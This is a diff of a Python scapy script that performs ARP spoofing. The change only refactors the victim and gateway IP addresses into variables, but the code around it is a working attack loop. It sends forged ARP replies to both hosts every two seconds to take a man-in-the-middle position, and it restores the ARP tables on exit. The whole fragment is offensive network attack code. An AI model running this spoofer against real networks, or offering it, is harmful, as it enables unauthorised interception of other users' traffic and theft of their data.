@@ -26,17 +26,20 @@ def restore(source_ip, destination_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
+target = "192.168.0.15"
+gateway = "192.168.0.1"
+
 packets_sent_counter = 0
 try:
     while True:
-        spoof("192.168.0.15", "192.168.0.1")
-        spoof("192.168.0.1", "192.168.0.15")
+        spoof(target, gateway)
+        spoof(gateway, target)
         packets_sent_counter += 2
         print("\r[+] Packets Sent: " + str(packets_sent_counter)),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    restore("192.168.0.15", "192.168.0.1")
-    restore("192.168.0.1", "192.168.0.15")
+    restore(target, gateway)
+    restore(gateway, target)
     print("\n[+] Restoring arp tables.")
     print("[+] Bye")
